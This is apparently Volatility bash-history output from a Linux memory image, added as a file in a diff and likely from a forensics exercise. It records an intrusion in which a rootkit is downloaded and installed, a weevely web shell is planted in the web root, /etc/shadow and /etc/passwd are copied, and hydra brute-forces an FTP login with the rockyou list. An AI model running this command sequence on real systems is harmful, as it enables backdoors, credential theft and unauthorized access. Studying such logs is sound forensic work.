@@ -1,0 +1,155 @@
+Pid      Name                 Command Time                   Command
+-------- -------------------- ------------------------------ -------
+    7682 bash                 2015-05-04 17:50:59 UTC+0000   cat .bashrc
+    7682 bash                 2015-05-04 17:51:03 UTC+0000   history
+    7682 bash                 2015-05-04 17:51:03 UTC+0000   history
+    7682 bash                 2015-05-04 17:54:34 UTC+0000   cd /tmp
+    7682 bash                 2015-05-04 17:54:35 UTC+0000   ls
+    7682 bash                 2015-05-04 17:58:22 UTC+0000   wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/xingyiquan.tar.gz
+    7682 bash                 2015-05-04 17:58:25 UTC+0000   ls
+    7682 bash                 2015-05-04 17:58:52 UTC+0000   su mysqll
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /usr/local/mysql
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ./weevely.py generate 'hacked'
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls -a
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cp weevely.php /var/www/html/index3.php
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls /usr/local/mysql
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/weevely-0.7.tar.gz
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   python weevely.py 
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd .weevely
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   sudo apt-get install hydra
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   mv weevely .weevely
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   sudo apt-get install python-beautifulsoup
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   python weevely.py generate.php
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd weevely
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   tar xavf weevely-0.7.tar.gz 
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ./weevely.py generate 'hacked'
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   rm *.gz
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   mv /home/mysqll/ /usr/local/mysql
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls -l
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   more README 
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   python weevely.py 
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd ..
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   lastb
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   last
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls -a
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   sudo apt-get install hydra
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   nmap 192.168.56.101
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd ..
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cp rockyou.txt.bz2 /usr/local/mysql/.
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls /home
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   nmap 192.168.56.0/24
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cp /etc/passwd ./.
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   chmod 777 shadow
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cp /etc/shadow ./.
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   hydra -l sue -P /tmp/rockyou.txt localhost ftp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   nmap localhost
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   ls
+    8021 bash                 2015-05-04 17:58:55 UTC+0000   bunzip2 rockyou.txt.bz2 
+    8021 bash                 2015-05-04 17:59:12 UTC+0000   cp xingyiquan.tar.gz /usr/local/mysql
+    8021 bash                 2015-05-04 17:59:21 UTC+0000   cd /usr/local/mysql
+    8021 bash                 2015-05-04 17:59:21 UTC+0000   ls
+    8021 bash                 2015-05-04 17:59:37 UTC+0000   mkdir .hacked
+    8021 bash                 2015-05-04 17:59:47 UTC+0000   mv *.bz2 .hacked/.
+    8021 bash                 2015-05-04 17:59:53 UTC+0000   mv *.gz .hacked/.
+    8021 bash                 2015-05-04 17:59:54 UTC+0000   ls
+    8021 bash                 2015-05-04 18:00:02 UTC+0000   cd ./hacked
+    8021 bash                 2015-05-04 18:00:05 UTC+0000   cd .hacked/
+    8021 bash                 2015-05-04 18:00:06 UTC+0000   ls
+    8021 bash                 2015-05-04 18:00:23 UTC+0000   tar xavf xingyiquan.tar.gz 
+    8021 bash                 2015-05-04 18:00:28 UTC+0000   ls
+    8021 bash                 2015-05-04 18:00:34 UTC+0000   bunzip2 rockyou.txt.bz2 
+    8021 bash                 2015-05-04 18:02:17 UTC+0000   ls
+    8021 bash                 2015-05-04 18:02:29 UTC+0000   rm *.gz
+    8021 bash                 2015-05-04 18:02:30 UTC+0000   ls
+    8021 bash                 2015-05-04 18:02:33 UTC+0000   cd xingyiquan/
+    8021 bash                 2015-05-04 18:02:34 UTC+0000   ls
+    8021 bash                 2015-05-04 18:02:38 UTC+0000   ./install 
+    8021 bash                 2015-05-04 18:04:51 UTC+0000   nmap localhost
+    8021 bash                 2015-05-04 18:24:08 UTC+0000   ls
+    8021 bash                 2015-05-04 18:24:23 UTC+0000   cd /
+    8021 bash                 2015-05-04 18:24:23 UTC+0000   ls
+    8021 bash                 2015-05-04 18:31:00 UTC+0000   uname -a
+    8021 bash                 2015-05-04 18:35:48 UTC+0000   ls
+    8021 bash                 2015-05-04 18:35:48 UTC+0000   cd /tmp
+    8021 bash                 2015-05-04 18:36:04 UTC+0000   ls -l
+    8021 bash                 2015-05-04 18:36:06 UTC+0000   ls -al
+    8021 bash                 2015-05-04 18:36:33 UTC+0000   cd /home/john
+    8021 bash                 2015-05-04 18:36:34 UTC+0000   ls
+    8021 bash                 2015-05-04 18:37:27 UTC+0000   insmod ./lime-3.16.0-30-generic.ko "tcp:4444 format=lime"
+    8021 bash                 2015-05-04 18:38:04 UTC+0000   insmod ./lime-3.16.0-30-generic.ko "path=tcp:4444 format=lime"
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /usr/local/mysql
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ./weevely.py generate 'hacked'
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -a
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls /usr/local/mysql
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/weevely-0.7.tar.gz
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   mv weevely .weevely
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp weevely.php /var/www/html/index3.php
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py 
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd .weevely
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install hydra
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py generate.php
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install python-beautifulsoup
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   tar xavf weevely-0.7.tar.gz 
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -l
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ./weevely.py generate 'hacked'
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   rm *.gz
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   more README 
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   mv /home/mysqll/ /usr/local/mysql
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd ..
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py 
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd weevely
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   lastb
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   last
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -a
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install hydra
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap 192.168.56.101
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd ..
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp rockyou.txt.bz2 /usr/local/mysql/.
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls /home
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap 192.168.56.0/24
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp /etc/passwd ./.
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   chmod 777 shadow
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp /etc/shadow ./.
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   hydra -l sue -P /tmp/rockyou.txt localhost ftp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   nmap localhost
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
+    9210 bash                 2015-05-04 18:16:26 UTC+0000   bunzip2 rockyou.txt.bz2 
+    9210 bash                 2015-05-04 18:16:28 UTC+0000   ls
